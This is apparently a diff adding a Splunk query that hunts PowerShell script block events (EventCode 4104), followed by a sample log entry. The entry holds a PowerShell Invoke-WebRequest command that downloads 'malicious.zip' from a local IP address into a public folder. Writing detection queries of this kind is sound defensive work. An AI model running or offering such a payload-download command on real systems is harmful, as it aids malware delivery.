@@ -1,1 +1,11 @@
+Spl query
+index=* EventCode=4104
+| table _time, host, source, sourcetype, Message
+| sort -_time
+
+---
+
+    Message: Invoke-WebRequest -Uri http://192.168.1.100:8080/malicious.zip -OutFile C:\Users\Public\malicious.zip
+    User: USERNAME
+    Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
